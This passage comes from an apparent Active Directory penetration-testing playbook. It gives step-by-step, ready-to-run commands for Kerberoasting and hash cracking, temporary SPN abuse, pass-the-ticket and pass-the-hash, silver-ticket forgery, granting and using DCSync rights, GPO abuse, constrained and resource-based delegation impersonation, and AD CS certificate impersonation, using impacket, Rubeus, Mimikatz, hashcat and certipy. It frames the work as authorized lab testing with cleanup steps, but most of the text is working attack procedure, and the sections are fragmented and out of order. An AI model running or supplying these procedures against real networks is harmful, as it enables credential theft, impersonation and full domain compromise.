title: 6.3.11.11 Request a selected service ticket for offline service-account recovery
text: id="request-a-selected-service-ticket-for-offline-service-account-recovery">6.3.11.11 Request a selected service ticket for offline service-account recovery Blocks: 11; credential classification in 5. Operational procedure | Quick sheet <h3

title: 6.3.11.11.1 Purpose and result
text: id="1-purpose-and-result-6">6.3.11.11.1 Purpose and result A selected TGS recovery artifact and possibly a recovered service-account password. <h3

title: 6.3.11.11.2 Recognition clues
text: id="2-recognition-clues-6">6.3.11.11.2 Recognition clues A user-owned SPN and a useful service-account relationship. <h4

title: 6.3.11.11.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-6">6.3.11.11.2.1 Find the clue from your starting access Where to investigate: Use a directory client's user-owned SPN inventory and inspect the associated account's memberships/utility before requesting a selected ticket. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Record SPN/account/encryption type and verify any recovered password against the intended identity. Failure/next check: No crack means only the tried candidates failed; a ticket request does not prove a weak password or host access. Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. samaccountname: SERVICE_USER serviceprincipalname: HTTP/TARGET_HOST object type: user Recognize this detail: A user-owned SPN supplies the account key targeted by a service ticket and a reason to assess password-recovery feasibility. Still missing before method selection: Verify valid KDC context, selected account/SPN, returned encryption type, password model and useful resulting rights. Outcome after checking Example and next decision Enabled after validation The selected ticket artifact is supported and recovery is justified: choose the matching offline mode. Ruled out in this context The candidate has no SPN and no SPN-write right: reject ordinary/targeted roasting for this account. Inconclusive SPN presence alone leaves weak password and eventual host access unproved. If you do not yet have this clue: start with Identify service accounts and SPNs worth investigating . <h3

title: 6.3.11.11.3 Prerequisites
text: id="3-prerequisites-6">6.3.11.11.3 Prerequisites Starting access: A domain identity, appropriate host privilege, or a validated effective directory-object right. Required conditions: A valid domain authentication/TGT context, reachable KDC, target SPN and a feasible password/encryption candidate strategy. <h3

title: 6.3.11.11.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-6">6.3.11.11.4 Discover and verify prerequisites impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' <h3

title: 6.3.11.11.5 Why it works
text: id="5-why-it-works-6">6.3.11.11.5 Why it works The service ticket is encrypted with the service account's long-term key. Request permission does not equal service administration, and strong machine/account keys can make recovery infeasible. <h3

title: 6.3.11.11.6 Execute and choose variants
text: id="6-execute-and-choose-variants-6">6.3.11.11.6 Execute and choose variants <h5

title: 6.3.11.11.6.1.1 Why Kerberoasting works
text: id="why-kerberoasting-works">6.3.11.11.6.1.1 Why Kerberoasting works Any valid domain identity can normally request a service ticket for an SPN. The ticket is encrypted with key material belonging to the SPN account, allowing offline password guessing. VALID DOMAIN IDENTITY + SPN ACCOUNT + KDC ROUTE -> TGS-REP CIPHER -> OFFLINE GUESSING -> SERVICE-ACCOUNT PASSWORD IF A CANDIDATE VERIFIES Rank SPN accounts before requesting tickets: group/ACL value, service/host, account type, password age, enabled state and resulting access matter more than collecting every ticket. <h5

title: 6.3.11.11.6.1.2 Enumerate without requesting tickets
text: id="enumerate-without-requesting-tickets">6.3.11.11.6.1.2 Enumerate without requesting tickets impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER' Rubeus.exe kerberoast /stats /domain:DOMAIN /dc:DC_HOST <h5

title: 6.3.11.11.6.1.3 Request one selected user
text: id="request-one-selected-user">6.3.11.11.6.1.3 Request one selected user impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile kerberoast-TARGET_USER.hashes 'DOMAIN/USER' Rubeus.exe kerberoast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes <summary

title: 6.3.11.11.6.1.3.1 Request all mapped candidates
text: id="variant-6-3-11-11-6-1-3-1">6.3.11.11.6.1.3.1 Request all mapped candidates impacket-GetUserSPNs -request -dc-ip DC_IP \ -outputfile kerberoast.hashes 'DOMAIN/USER' Rubeus.exe kerberoast /domain:DOMAIN /dc:DC_HOST /outfile:kerberoast.hashes Use broad requests only when scope and the candidate inventory justify them. Prefer one ranked account during verification. <h5

title: 6.3.11.11.6.1.4 Hash type and cracking
text: id="hash-type-and-cracking">6.3.11.11.6.1.4 Hash type and cracking Prefix Kerberos etype Hashcat mode $krb5tgs$23$ RC4-HMAC 13100 $krb5tgs$17$ AES128 19600 $krb5tgs$18$ AES256 19700 hashcat -m 13100 kerberoast.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19600 kerberoast-aes128.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 19700 kerberoast-aes256.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m MODE HASH_FILE --show Select the mode from the actual prefix and current hashcat --example-hashes ; do not assume every TGS is RC4. AES material is still an offline verifier but generally costs more per guess. Cracking feasibility is governed mainly by password strength and candidates, not merely ticket acquisition. <h5

title: 6.3.11.11.6.1.5 Common failures
text: id="common-failures">6.3.11.11.6.1.5 Common failures no SPNs returned: wrong domain/base/authentication context, filtering or no user SPNs; KDC_ERR_S_PRINCIPAL_UNKNOWN : SPN is absent/malformed or queried in the wrong realm; KDC_ERR_ETYPE_NOSUPP : requested cipher conflicts with account/domain policy; output wraps or fails to load: save directly to an output file and verify prefix/line integrity; crack exhausts candidates: password not represented by the tested model; the account is not therefore “secure.” <h3

title: 6.3.11.12.6 Execute and choose variants
text: id="6-execute-and-choose-variants-7">6.3.11.12.6 Execute and choose variants If Block 10 proved effective write access to a user object's servicePrincipalName , an SPN can be temporarily added, requested and removed. This is a state-changing directory attack and must preserve original state. Built-in SPN operations: setspn -L TARGET_USER setspn -S temporary/TARGET_USER TARGET_USER Request only that account: impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile targeted-TARGET_USER.hashes 'DOMAIN/USER' Cleanup: setspn -D temporary/TARGET_USER TARGET_USER setspn -L TARGET_USER The controlled right must apply to the SPN attribute, -S must not collide with an existing SPN, and cleanup is part of the procedure. A recovered password is still validated and mapped as a new identity. If the effective right permits writing servicePrincipalName on a user, add a unique temporary SPN, request that account's ticket and remove the SPN immediately. The cracking workflow is in Kerberos and identity transitions . setspn -S TEMP/TARGET_USER TARGET_USER setspn -Q TEMP/TARGET_USER Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat setspn -D TEMP/TARGET_USER TARGET_USER <h3

Field/pattern Interpretation Decision Client: USER @ REALM Identity represented Map that exact user/computer and realm Client ending in $ Computer identity Establish machine-account rights; do not treat as a human user Server: krbtgt/REALM TGT Can request service tickets while valid, within that client's authorization Server: cifs/HOST CIFS service ticket Only SMB/CIFS on the named host; authorization still applies Server: ldap/DC_HOST LDAP service ticket LDAP authentication, not replication rights Other SERVICE/HOST Ticket for that SPN Use matching hostname/service/client Start/End/Renew Time Validity windows Import cannot revive an expired/not-yet-valid ticket Ticket flags Kerberos behavior/history Not evidence of privilege Kdc Called Issuing KDC Not evidence of access to that DC Encryption/session key Compatibility/policy clue Not privilege or password strength Linux cache: klist -c ticket.ccache export KRB5CCNAME="$PWD/ticket.ccache" Convert only when a client expects the other container: impacket-ticketConverter ticket.kirbi ticket.ccache impacket-ticketConverter ticket.ccache ticket.kirbi These commands establish a local ticket context. Block 12 selects and validates the remote service. Windows/Rubeus: Rubeus.exe ptt /ticket:ticket.kirbi klist Windows/Mimikatz: kerberos::ptt ticket.kirbi kerberos::list Linux: export KRB5CCNAME="$PWD/ticket.ccache" klist NT hash or AES key to a TGT: Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist Use /aes128: or /aes256: when that is the actual key type and tool version supports it. RC4-based requests can fail where RC4 is disabled even though the NT hash is correct. Mimikatz creates a new process using supplied key material: sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:cmd.exe This is a credential/ticket-context transition, not proof that a destination accepts the identity. klist klist tgt klist sessions When privileges permit inspecting another logon session: klist -li 0xLUID tickets klist -li 0xLUID tgt Rubeus.exe triage Rubeus.exe dump /luid:0xLUID /nowrap Do not use klist purge during triage. text: id="5-why-it-works-9">6.3.11.14.5 Why it works A silver ticket is encrypted for a service account rather than issued through a new domain TGT. Its acceptance depends on service/PAC validation; it is not universal domain-administrator authority. <h3

title: 6.3.11.14.6 Execute and choose variants
text: id="6-execute-and-choose-variants-9">6.3.11.14.6 Execute and choose variants Prerequisite: key/hash of the account encrypting the target SPN's tickets, domain SID, exact SPN/service/host, a plausible existing domain identity and compatible target-service validation behavior. Linux/Impacket: impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist Windows/Mimikatz: kerberos::golden /sid:DOMAIN_SID /domain:DOMAIN /target:TARGET_HOST /service:cifs /rc4:SERVICE_NT_HASH /user:AUTHORIZED_TEST_USER /ptt Despite the Mimikatz module name, supplying a service/target key produces a silver/service ticket, not a krbtgt-signed TGT. Important boundaries: the key must belong to the account that owns the SPN; machine-account keys commonly protect host services; the ticket is limited to the named service/host and whichever services share the same account key; current PAC enforcement means using a nonexistent identity can fail; use a real authorized test identity and validate behavior; a service may perform KDC/PAC validation or additional authorization; a successfully imported ticket is not successful service access. Golden tickets require the KRBTGT key and domain SID and create a forged TGT. They are a high-impact persistence concept covered in the conditional domain-compromise section , not a default Block 11 action. <h3

text: id="find-the-clue-from-your-starting-access-11">6.3.11.16.2.1 Find the clue from your starting access Where to investigate: Select the useful group from mapping and inspect its current member list and exact member-attribute ACL. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Exact target group, controlled principal, useful resulting right and a fresh token/logon context Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify directory membership and actual service action from a refreshed context, then restore the original membership. Failure/next check: An old token, wrong group or nesting/policy behavior can leave authorization unchanged despite a successful modification. Get-DomainGroupMember -Identity TARGET_GROUP Get-DomainObjectAcl -Identity TARGET_GROUP -ResolveGUIDs Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Target group: ACCESS_GROUP Effective permitted operation: write member Controlled account: not currently a member Recognize this detail: A membership-write operation can grant a defined group capability once new logon/token state reflects it. Still missing before method selection: Verify effective right, actual group-derived authorization, nesting/token refresh and restoration. Outcome after checking Example and next decision Enabled after validation The membership and a fresh context enable the intended service action: choose the group transition. Ruled out in this context The writable attribute is not member or the group grants no intended right: reject that chain. Inconclusive Directory modification without refreshed/accepted authorization leaves practical effect unresolved. If you do not yet have this clue: start with Validate effective directory-object control . <h3

title: 6.3.11.17.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-12">6.3.11.17.2.1 Find the clue from your starting access Where to investigate: Inspect resolved ownership/DACL rights on the exact useful object and separate the intermediate right from the final desired operation. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Correct object/ACE semantics, permission to perform the required intermediate change and a preserved original ACL/owner Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify the intermediate owner/DACL state and final operation separately; restore original state afterward. Failure/next check: Protected-object behavior, scope/inheritance or a missing intermediate right can break the chain. Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Trustee: CONTROLLED_PRINCIPAL Effective right candidate: WriteOwner or WriteDacl Recognize this detail: Ownership/DACL control may enable a narrower useful ACE; it is an intermediate capability. Still missing before method selection: Validate actual owner semantics, deny/protected-object behavior, ability to grant the next right and original-state restoration. Outcome after checking Example and next decision Enabled after validation The intermediate operation and narrow effective right are established: follow the linked reset/group/SPN method. Ruled out in this context The ACE targets another object scope or is ineffective for this trustee: reject that route. Inconclusive WriteOwner text alone does not prove every later DACL modification succeeds. If you do not yet have this clue: start with Validate effective directory-object control . <h3

text: id="5-why-it-works-12">6.3.11.17.5 Why it works Ownership and DACL control are intermediate capabilities. Grant the narrow operation required for the next method and validate that it applies; do not treat ACL text as completed account compromise. <h3

title: 6.3.11.17.6 Execute and choose variants
text: id="6-execute-and-choose-variants-12">6.3.11.17.6 Execute and choose variants WriteOwner can make the controlled identity the owner; ownership may then permit a DACL change. WriteDacl can grant only the narrower right needed for the intended transition. <h4

text: id="2-recognition-clues-13">6.3.11.18.2 Recognition clues A principal has the relevant effective replication rights at the domain naming context. <h4

title: 6.3.11.18.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-13">6.3.11.18.2.1 Find the clue from your starting access Where to investigate: Inspect the domain naming-context ACL and resolve replication-specific extended rights for the controlled identity/group. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Required replication extended rights, DC RPC connectivity and correct domain identity; access to a member server is insufficient Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify the replication source, account and material type; avoid equating a tool label with proven rights. Failure/next check: RPC route, identity context and missing replication rights produce different failures; verify each prerequisite. Get-DomainObjectAcl -Identity DOMAIN_DN -ResolveGUIDs Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Applicable domain ACEs: DS-Replication-Get-Changes DS-Replication-Get-Changes-All Trustee: CONTROLLED_PRINCIPAL Recognize this detail: Replication rights at the domain scope are the relevant clue; local administrator rights on a member host are different. Still missing before method selection: Verify the complete effective replication rights for selected data, trustee membership, DC/RPC route and identity context. Outcome after checking Example and next decision Enabled after validation The required rights and route produce the bounded selected-account proof: choose DRS replication. Ruled out in this context The ACE applies only to a user/OU or lacks required replication rights: reject DCSync. Inconclusive Unresolved GUIDs or RPC filtering leave rights/access separately unknown. If you do not yet have this clue: start with Validate effective directory-object control . <h3

title: 6.3.11.18.3 Prerequisites
text: id="3-prerequisites-13">6.3.11.18.3 Prerequisites Starting access: A domain identity, appropriate host privilege, or a validated effective directory-object right. Required conditions: Required replication extended rights, DC RPC connectivity and correct domain identity; access to a member server is insufficient. <h3

title: 6.3.11.18.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-13">6.3.11.18.4 Discover and verify prerequisites Get-DomainObjectAcl -Identity DOMAIN_DN -ResolveGUIDs <h3

title: 6.3.11.18.5 Why it works
text: id="5-why-it-works-13">6.3.11.18.5 Why it works DCSync uses the replication protocol instead of reading a local LSASS process or copying NTDS. Its authorization comes from domain replication rights, not an arbitrary local administrator token. <h3

title: 6.3.11.18.6 Execute and choose variants
text: id="6-execute-and-choose-variants-13">6.3.11.18.6 Execute and choose variants Prerequisite: effective domain-root rights equivalent to Replicating Directory Changes plus Replicating Directory Changes All (and filtered-set rights where applicable). Domain membership or local admin on an ordinary host is insufficient. Validate ACLs at the domain root: Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' } A controlled DACL transition can grant these rights, but doing so changes the domain security descriptor and creates a domain-compromise path: <h4

title: 6.3.11.18.6.1 Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose
text: id="variant-6-3-11-18-6-1">6.3.11.18.6.1 Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose <h4

title: 6.3.11.18.6.2 Remove the delegated replication ACE after the authorized objective
text: id="variant-6-3-11-18-6-2">6.3.11.18.6.2 Remove the delegated replication ACE after the authorized objective # Remove the delegated replication ACE after the authorized objective Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CONTROLLED_USER -Rights DCSync -Verbose Local administrator rights on a member host, an LDAP bind or a valid Kerberos ticket do not supply replication rights. Re-read the effective domain-root ACL before and after a change. Request one approved test account rather than dumping the directory: impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \ 'DOMAIN/USER:PASSWORD@DC_HOST' Mimikatz equivalent from an authorized Windows context: lsadump::dcsync /domain:DOMAIN /user:TARGET_USER Decisive output: selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection. <h3

Interpretation: classify and retain it privately. <h3

text: id="conditional-trace-gpo-control-to-privileged-policy-consumption">6.3.11.19 Conditional: trace GPO control to privileged policy consumption Blocks: 11; credential classification in 5. Operational procedure | Quick sheet <h3

title: 6.3.11.19.1 Purpose and result
text: id="1-purpose-and-result-14">6.3.11.19.1 Purpose and result A verified policy-backed privileged action on an in-scope host. <h3

title: 6.3.11.19.2 Recognition clues
text: id="2-recognition-clues-14">6.3.11.19.2 Recognition clues A useful linked GPO has a potentially controllable directory or SYSVOL component. <h4

title: 6.3.11.19.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-14">6.3.11.19.2.1 Find the clue from your starting access Where to investigate: Enumerate GPO/OU links, then inspect the relevant directory object and SYSVOL policy component's effective control and target applicability. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Effective rights on the necessary GPO components, applicable target scope/filtering, writable policy artifact and a privileged refresh trigger Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify actual policy application and resulting privileged effect; retain/restorable original policy state. Failure/next check: Wrong link, filtering, unavailable refresh or missing file rights invalidates the chain. Keep this as a conditional supplement. Get-DomainGPO Get-DomainOU | Select-Object name,gplink Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. OU: TARGET_OU gPLink: POLICY_GUID Potential GPO control: inspect directory and file components Recognize this detail: A linked policy supplies a potential privileged consumer only for hosts to which it actually applies. Still missing before method selection: Check both needed policy components, effective ACEs, security/WMI filtering, target scope and refresh trigger. Outcome after checking Example and next decision Enabled after validation The controlled policy is consumed on the intended host and effect verified: choose this conditional route. Ruled out in this context The target is excluded by policy filtering: reject that policy-to-host chain. Inconclusive A writable GPO object without linked/applicable file-consumer evidence remains incomplete. If you do not yet have this clue: start with Validate effective directory-object control . <h3

title: 6.3.11.19.3 Prerequisites
text: id="3-prerequisites-14">6.3.11.19.3 Prerequisites Starting access: A domain identity, appropriate host privilege, or a validated effective directory-object right. Required conditions: Effective rights on the necessary GPO components, applicable target scope/filtering, writable policy artifact and a privileged refresh trigger. <h3

title: 6.3.11.19.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-14">6.3.11.19.4 Discover and verify prerequisites Get-DomainGPO Get-DomainOU | Select-Object name,gplink <h3

title: 6.3.11.19.5 Why it works
text: id="5-why-it-works-14">6.3.11.19.5 Why it works GPO control spans directory objects, files, links and client-side processing. A writable GPO object alone does not prove that the intended host consumes the chosen setting. <h3

title: 6.3.11.19.6 Execute and choose variants
text: id="6-execute-and-choose-variants-14">6.3.11.19.6 Execute and choose variants Identify GPOs and links: Get-DomainGPO Get-DomainOU | Select-Object name,distinguishedname,gplink Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteProperty' } For a candidate, prove: the controlled principal can edit both the directory object and relevant SYSVOL policy files; the GPO is linked to the OU containing the intended test host/user; security filtering and WMI filters include that subject; the configured preference/task/script runs in the expected context; and policy refresh or another predictable trigger will occur. SharpGPOAbuse supports immediate-task/local-group techniques, but syntax is version-sensitive and the action changes domain policy. Inspect the installed build before a controlled lab action: SharpGPOAbuse.exe --help gpresult /r gpupdate /force Back up the GPO, restrict the target/scope, document the exact change and restore it after validation. <h3

title: 6.3.11.19.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-14">6.3.11.19.7 Worked example — hypothetical Observation: a group controls a GPO linked to an OU. Test: validate both policy components and actual target applicability. Illustrative output: security filtering excludes the target. Interpretation: the proposed policy-to-host chain is not enabled. <h3

title: 6.3.11.19.8 Verify the result
text: id="8-verify-the-result-14">6.3.11.19.8 Verify the result Verify actual policy application and resulting privileged effect; retain/restorable original policy state. <h3

title: 6.3.11.20.1 Purpose and result
text: id="1-purpose-and-result-15">6.3.11.20.1 Purpose and result A service-scoped impersonation ticket accepted by the intended destination. <h3

title: 6.3.11.20.2 Recognition clues
text: id="2-recognition-clues-15">6.3.11.20.2 Recognition clues Delegation configuration or computer-object write suggests a Kerberos impersonation path. <h4

title: 6.3.11.20.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-15">6.3.11.20.2.1 Find the clue from your starting access Where to investigate: Inspect directory delegation flags/attributes and map the service principals before considering any impersonation request. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Exact delegation type; required service/machine identity and key; allowed target/SPN; account flags and KDC policy permit the flow Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify the exact service ticket and successful destination action, with original delegation state preserved. Failure/next check: Protected accounts, unavailable service identity, unsupported encryption or wrong SPN can break the chain. Use only when the complete conditional path exists. Get-DomainComputer -TrustedToAuth Get-DomainComputer -Unconstrained Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Computer: TARGET_HOST Delegation-related flag: present Target service and controlled key: not yet established Recognize this detail: A delegation flag opens a configuration investigation; unconstrained, constrained and RBCD require different relationships. Still missing before method selection: Identify exact delegation type, controlled service/machine key, target SPN, relevant account flags and KDC acceptance. Outcome after checking Example and next decision Enabled after validation The complete matching relationship yields an accepted service ticket: use that service-scoped conditional path. Ruled out in this context The required service identity/key or allowed target is missing: reject that chain. Inconclusive A generic delegation label without actual attributes/keys leaves impersonation unproved. If you do not yet have this clue: start with Enumerate directory objects with native, LDAP and PowerView approaches . <h3

title: 6.3.11.20.3 Prerequisites
text: id="3-prerequisites-15">6.3.11.20.3 Prerequisites Starting access: A domain identity, appropriate host privilege, or a validated effective directory-object right. Required conditions: Exact delegation type; required service/machine identity and key; allowed target/SPN; account flags and KDC policy permit the flow. <h3

title: 6.3.11.20.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-15">6.3.11.20.4 Discover and verify prerequisites Get-DomainComputer -TrustedToAuth Get-DomainComputer -Unconstrained <h3

title: 6.3.11.20.5 Why it works
text: id="5-why-it-works-15">6.3.11.20.5 Why it works Unconstrained, constrained and resource-based delegation use different trust directions and prerequisites. Computer-object write is an intermediate right; it does not by itself provide a valid S4U ticket chain. <h3

title: 6.3.11.20.6 Execute and choose variants
text: id="6-execute-and-choose-variants-15">6.3.11.20.6 Execute and choose variants Enumerate before attempting any ticket operation: Get-DomainComputer -Unconstrained | Select-Object dnshostname Get-DomainUser -TrustedToAuth | Select-Object samaccountname Get-DomainComputer -TrustedToAuth | Select-Object dnshostname Get-DomainObject -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto impacket-findDelegation 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP Constrained delegation/S4U requires control of the delegated account/key and an allowed SPN: impacket-getST -spn ALLOWED_SPN -impersonate AUTHORIZED_TEST_USER \ -dc-ip DC_IP 'DOMAIN/DELEGATED_USER:PASSWORD' export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" Use the ticket only for the approved service/host. Unconstrained delegation can expose forwarded/cached tickets, but coercing authentication changes another host's behavior and is not a baseline. Validate only in a disposable authorized lab and protect ticket material. <h5

title: 6.3.11.20.6.1.1 Resource-based constrained delegation
text: id="resource-based-constrained-delegation">6.3.11.20.6.1.1 Resource-based constrained delegation Prerequisite: effective write control over the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity plus control of a principal with an SPN (often a lab computer account). impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \ -computer-pass 'LAB_MACHINE_PASSWORD' -dc-host DC_HOST -dc-ip DC_IP impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \ -action write -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \ -dc-ip DC_IP 'DOMAIN/LABCOMPUTER$:LAB_MACHINE_PASSWORD' Cleanup after the lab objective: impacket-rbcd -delegate-from 'LABCOMPUTER$' -delegate-to 'TARGETCOMPUTER$' \ -action remove -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \ -delete -dc-ip DC_IP Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites. <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Effective enrollment/template/CA rights and the exact vulnerable settings; issuance requirements, identity mapping and authentication route must all permit the path Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify issuance, matching private key, mapped account and a successful authentication effect; preserve and restore template changes. Failure/next check: Denied enrollment, approval, mapping hardening or missing key material needs a different conditional route, not a renamed certificate tool. certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Template: TEMPLATE_NAME Client Authentication: enabled Subject control: candidate setting Enrollment rights: GROUP Approval/identity mapping: inspect Recognize this detail: The conjunction of purpose, subject control and effective enrollment rights is a candidate; issuance and identity mapping are separate gates. Still missing before method selection: Check exact template/CA rights/settings, approval/signatures, required key, current mapping and authenticatable identity. Outcome after checking Example and next decision Enabled after validation Issuance and intended account authentication are verified: use the certificate capability. title: 6.3.11.21.6 Execute and choose variants
text: id="6-execute-and-choose-variants-16">6.3.11.21.6 Execute and choose variants Prerequisite: reachable CA/DC and a valid domain identity. Decisive output: a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path. Package names vary: command -v certipy-ad || command -v certipy certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -enabled -vulnerable -stdout Review: CA name and host; template name and whether it is enabled/published; who can enroll; client-authentication EKUs/purpose; subject/SAN supply controls; manager approval/signature requirements; template owner and modification rights; web enrollment/relay-related configuration where relevant. An ESC label is a candidate classification. Manually validate the properties and the controlled identity's effective rights. Generic request after validating a specific template: certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -target DC_HOST -ca CA_NAME -template TEMPLATE An alternate UPN/SID request is appropriate only when the validated template permits it and the lab explicitly authorizes impersonation testing: certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -target DC_HOST -ca CA_NAME -template TEMPLATE \ -upn 'TEST_USER@DOMAIN' -sid 'TEST_USER_SID' certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP Treat PFX files, tickets and returned hashes as credentials. Verify certificate subject/SID, validity and intended identity. A successful issuance is not the same as successful PKINIT authentication. Before any authorized template change, save configuration: certipy-ad template -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP \ -template TEMPLATE -save-configuration template-backup.json Template writes alter Active Directory configuration and may affect many principals. Use only an explicitly authorized disposable lab path, inspect certipy-ad template -h for the installed version, and restore the saved configuration after the demonstration. <h3

text: id="find-the-clue-from-your-starting-access-17">6.3.11.22.2.1 Find the clue from your starting access Where to investigate: Begin only after protected private evidence establishes the actual domain KRBTGT key and SID; inspect account/source metadata rather than assuming any domain hash suffices. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A domain identity, appropriate host privilege, or a validated effective directory-object right Requires: Correct KRBTGT cryptographic material, realm/SID/principal data, valid ticket parameters and compatible service/KDC validation behavior Action class: May request tickets, collect sensitive material or change directory state; use the exact selected procedure. Stop/verify: Verify cryptographic source, represented principal and exact service effect; protect the key and remove generated test credentials. Failure/next check: Wrong key/version, realm, time or validation behavior can reject a forged ticket. Prefer legitimate current tickets for ordinary movement. klist whoami /user Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Private source classification: KRBTGT key, not ordinary service key Domain SID/realm: recorded Test service: explicitly scoped Recognize this detail: KRBTGT key exposure is the enabling post-compromise condition; an ordinary NT hash or unrelated ticket cannot substitute. Still missing before method selection: Verify current cryptographic material/version, realm/SID/principal, time and actual service validation; retain recovery/cleanup scope. Outcome after checking Example and next decision Enabled after validation The authorized isolated-lab ticket is accepted for the intended action: document the domain-key impact. Ruled out in this context Only an ordinary service-account key is available: reject realm-wide TGT forgery. Inconclusive A file labelled KRBTGT without source/version verification leaves the key claim unresolved. title: 6.3.11.22.6 